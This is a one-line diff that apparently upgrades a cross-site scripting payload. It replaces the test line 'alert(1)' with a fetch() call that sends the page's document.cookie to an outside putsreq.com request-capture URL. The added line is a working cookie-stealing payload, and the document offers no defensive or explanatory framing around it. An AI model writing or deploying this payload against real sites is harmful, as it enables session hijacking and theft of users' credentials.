@@ -1,1 +1,1 @@
-alert(1)
+fetch(`https://putsreq.com/iMIkUoHjLWMr5UpWfE0l?${document.cookie}`);
